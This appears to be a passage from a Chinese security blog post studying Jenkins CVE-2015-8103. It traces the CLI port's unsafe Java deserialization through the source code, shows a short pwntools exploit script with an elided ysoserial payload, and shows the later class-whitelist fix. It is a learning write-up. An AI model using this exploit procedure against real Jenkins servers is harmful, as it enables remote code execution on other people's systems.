

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
  <link rel="icon" href="/css/images/bg/favicon.ico">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Aluvion">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言 Jenkins 历史漏洞学习记录。">
<meta property="og:type" content="article">
<meta property="og:title" content="Jenkins相关漏洞学习（一）">
<meta property="og:url" content="http://yoursite.com/2020/11/24/Jenkins%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
<meta property="og:site_name" content="Twings">
<meta property="og:description" content="前言 Jenkins 历史漏洞学习记录。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-11-24T06:30:00.000Z">
<meta property="article:modified_time" content="2022-04-15T13:46:17.752Z">
<meta property="article:author" content="Aluvion">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Jenkins">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>Jenkins相关漏洞学习（一） - Twings</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Twings&#39; Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/css/images/bg/bg5.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Jenkins相关漏洞学习（一）"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2020-11-24 14:30" pubdate>
          2020年11月24日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.1k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          52 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Jenkins相关漏洞学习（一）</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> Jenkins 历史漏洞学习记录。</p>
<span id="more"></span>

<hr>
<h3 id="CVE-2015-8103"><a href="#CVE-2015-8103" class="headerlink" title="CVE-2015-8103"></a>CVE-2015-8103</h3><p>用 docker 开个 Jenkins 环境：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull jenkins:1.625.1<br>docker run -<span class="hljs-built_in">id</span> --name jenkins -p 32770:8080 -p32771:50000 jenkins:1.625.1<br></code></pre></td></tr></table></figure>

<p>然后从里面把 war 包拖出来解压打开。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>该漏洞发生在 Jenkins 的 cli 模块，访问可以在 HTTP Headers 中找到 cli 端口为 50000：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Content-Type-Options</span><span class="hljs-punctuation">: </span>nosniff<br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>0<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache,no-store,must-revalidate<br><span class="hljs-attribute">X-Hudson-Theme</span><span class="hljs-punctuation">: </span>default<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html;charset=UTF-8<br><span class="hljs-attribute">X-Hudson</span><span class="hljs-punctuation">: </span>1.395<br><span class="hljs-attribute">X-Jenkins</span><span class="hljs-punctuation">: </span>1.625.1<br><span class="hljs-attribute">X-Jenkins-Session</span><span class="hljs-punctuation">: </span>326782aa<br><span class="hljs-attribute">X-Hudson-CLI-Port</span><span class="hljs-punctuation">: </span>50000<br><span class="hljs-attribute">X-Jenkins-CLI-Port</span><span class="hljs-punctuation">: </span>50000<br><span class="hljs-attribute">X-Jenkins-CLI2-Port</span><span class="hljs-punctuation">: </span>50000<br><span class="hljs-attribute">X-Frame-Options</span><span class="hljs-punctuation">: </span>sameorigin<br><span class="hljs-attribute">X-Instance-Identity</span><span class="hljs-punctuation">: </span>...<br><span class="hljs-attribute">X-SSH-Endpoint</span><span class="hljs-punctuation">: </span>...<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3221<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Jetty(winstone-2.8)<br></code></pre></td></tr></table></figure>

<p>这个端口是由 TcpSlaveAgentListener 对象监听的一个 TCP 端口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TcpSlaveAgentListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;TCP slave agent listener port=&quot;</span> + port);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.serverSocket = ServerSocketChannel.open();<br>        <span class="hljs-built_in">this</span>.serverSocket.socket().bind(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(port));<br>    &#125; <span class="hljs-keyword">catch</span> (BindException var3) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.configuredPort = port;<br>    LOGGER.log(Level.FINE, <span class="hljs-string">&quot;JNLP slave agent listener started on TCP port &#123;0&#125;&quot;</span>, <span class="hljs-built_in">this</span>.getPort());<br>    <span class="hljs-built_in">this</span>.start();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其 run 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.serverSocket.accept().socket();<br>            s.setKeepAlive(<span class="hljs-literal">true</span>);<br>            s.setTcpNoDelay(<span class="hljs-literal">true</span>);<br>            (<span class="hljs-keyword">new</span> <span class="hljs-title class_">TcpSlaveAgentListener</span>.ConnectionHandler(s)).start();<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.shuttingDown) &#123;<br>            LOGGER.log(Level.SEVERE, <span class="hljs-string">&quot;Failed to accept JNLP slave agent connections&quot;</span>, var2);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接收到一个 TCP 连接后交给 ConnectionHandler 对象处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConnectionHandler</span><span class="hljs-params">(Socket s)</span> &#123;<br>    <span class="hljs-built_in">this</span>.s = s;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.getClass()) &#123;<br>        <span class="hljs-built_in">this</span>.id = TcpSlaveAgentListener.iotaGen++;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.setName(<span class="hljs-string">&quot;TCP slave agent connection handler #&quot;</span> + <span class="hljs-built_in">this</span>.id + <span class="hljs-string">&quot; with &quot;</span> + s.getRemoteSocketAddress());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        TcpSlaveAgentListener.LOGGER.info(<span class="hljs-string">&quot;Accepted connection #&quot;</span> + <span class="hljs-built_in">this</span>.id + <span class="hljs-string">&quot; from &quot;</span> + <span class="hljs-built_in">this</span>.s.getRemoteSocketAddress());<br>        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-built_in">this</span>.s.getInputStream());<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-built_in">this</span>.s.getOutputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>)), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> in.readUTF();<br>        <span class="hljs-keyword">if</span> (s.startsWith(<span class="hljs-string">&quot;Protocol:&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> s.substring(<span class="hljs-number">9</span>);<br>            <span class="hljs-type">AgentProtocol</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> AgentProtocol.of(protocol);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">null</span>) &#123;<br>                p.handle(<span class="hljs-built_in">this</span>.s);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.error(out, <span class="hljs-string">&quot;Unknown protocol:&quot;</span> + s);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.error(out, <span class="hljs-string">&quot;Unrecognized protocol: &quot;</span> + s);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException var8) &#123;<br>        ...<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;<br>        ...<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>从传输数据中读取一个字符串 “Protocol:”，然后从其后面读取协议名并调用相应协议的 handler 函数，这里传入 “CLI-connect” 进入 CliProtocol 类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Socket socket)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException &#123;<br>    (<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliProtocol</span>.Handler(<span class="hljs-built_in">this</span>.nio.getHub(), socket)).run();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Handler</span><span class="hljs-params">(NioChannelHub hub, Socket socket)</span> &#123;<br>    <span class="hljs-built_in">this</span>.hub = hub;<br>    <span class="hljs-built_in">this</span>.socket = socket;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException &#123;<br>    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-built_in">this</span>.socket.getOutputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>)), <span class="hljs-literal">true</span>);<br>    out.println(<span class="hljs-string">&quot;Welcome&quot;</span>);<br>    <span class="hljs-built_in">this</span>.runCli(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Connection</span>(<span class="hljs-built_in">this</span>.socket));<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runCli</span><span class="hljs-params">(Connection c)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CLI channel from &quot;</span> + <span class="hljs-built_in">this</span>.socket.getInetAddress();<br>    <span class="hljs-type">ChannelBuilder</span> <span class="hljs-variable">cb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelBuilder</span>(name, Computer.threadPoolForRemoting);<br>    <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> cb.withMode(Mode.BINARY).withRestricted(<span class="hljs-literal">true</span>).withBaseLoader(Jenkins.getInstance().pluginManager.uberClassLoader).build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(c.in), <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(c.out));<br>    channel.setProperty(CliEntryPoint.class.getName(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliManagerImpl</span>(channel));<br>    channel.join();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在 runCli 函数中会调用 ChannelBuilder 类的 build 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; preambles.length; ++i) &#123;<br>    <span class="hljs-type">byte</span>[] preamble = preambles[i];<br>    <span class="hljs-keyword">if</span> (preamble[ptr[i]] == ch) &#123;<br>        <span class="hljs-keyword">if</span> (++ptr[i] == preamble.length) &#123;<br>            <span class="hljs-keyword">switch</span>(i) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    <span class="hljs-keyword">if</span> (mode == Mode.NEGOTIATE) &#123;<br>                        mode = modes[i];<br>                        os.write(mode.preamble);<br>                        os.flush();<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modes[i] != mode) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Protocol negotiation failure&quot;</span>);<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.makeTransport(is, os, mode, cap);<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    cap = Capability.read(is);<br>                <span class="hljs-keyword">default</span>:<br>                    ptr[i] = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ptr[i] = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>会跟三个 preambles 进行比较，然后做相应的操作，可以看到当符合第三个 preamble 时，会调用 Capability.read，第三个 preamble 为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PREAMBLE = <span class="hljs-string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>而 Capability.read 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Capability <span class="hljs-title function_">read</span><span class="hljs-params">(InputStream is)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Mode.TEXT.wrap(is));<br>        <span class="hljs-keyword">return</span> (Capability)ois.readObject();<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var2) &#123;<br>        <span class="hljs-keyword">throw</span> (Error)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NoClassDefFoundError</span>(var2.getMessage())).initCause(var2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>会进行 Java 反序列化，而观察 Jenkins 项目中 lib 目录下的 jar，可以发现里面存在 commons-collections-3.2.1.jar，所以可以用 ysoserial 生成序列化攻击链。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>用 pwntools 写个简单的交互脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>target = remote(<span class="hljs-string">&quot;...&quot;</span>, <span class="hljs-number">50000</span>)<br><br>protocol = <span class="hljs-string">&quot;Protocol:CLI-connect&quot;</span><br>target.send(<span class="hljs-string">&quot;\x00&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(protocol)) + protocol)<br>target.recv()<br>pause()<br>payload = <span class="hljs-string">&quot;aced...787878&quot;</span>.decode(<span class="hljs-string">&quot;hex&quot;</span>)<br>payload = base64.b64encode(payload)<br>target.send(<span class="hljs-string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span>)<br>target.send(payload)<br>pause()<br><br>target.interactive()<br>target.close()<br></code></pre></td></tr></table></figure>

<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在往后的版本（2.46.1）中流程发生了变化，不过逻辑变化不大，最后在 Capability.read 中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Capability <span class="hljs-title function_">read</span><span class="hljs-params">(InputStream is)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Channel.Mode.TEXT.wrap(is)) &#123;<br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> desc.getName();<br>                <span class="hljs-keyword">if</span> (!n.equals(<span class="hljs-string">&quot;java.lang.String&quot;</span>) &amp;&amp; !n.equals(<span class="hljs-string">&quot;[Ljava.lang.String;&quot;</span>) &amp;&amp; !n.equals(Capability.class.getName())) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<span class="hljs-string">&quot;Rejected: &quot;</span> + n);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>                &#125;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-keyword">return</span> (Capability)ois.readObject();<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var2) &#123;<br>        <span class="hljs-keyword">throw</span> (Error)(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NoClassDefFoundError</span>(var2.getMessage())).initCause(var2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对反序列化的类做了限制，只允许 String、String 数组 和 Capability。</p>
<p>除此之外，还将其他很多反序列化点的 ObjectInputStream 类修改为 ObjectInputStreamEx，其 resolveClass 函数如下：</p>
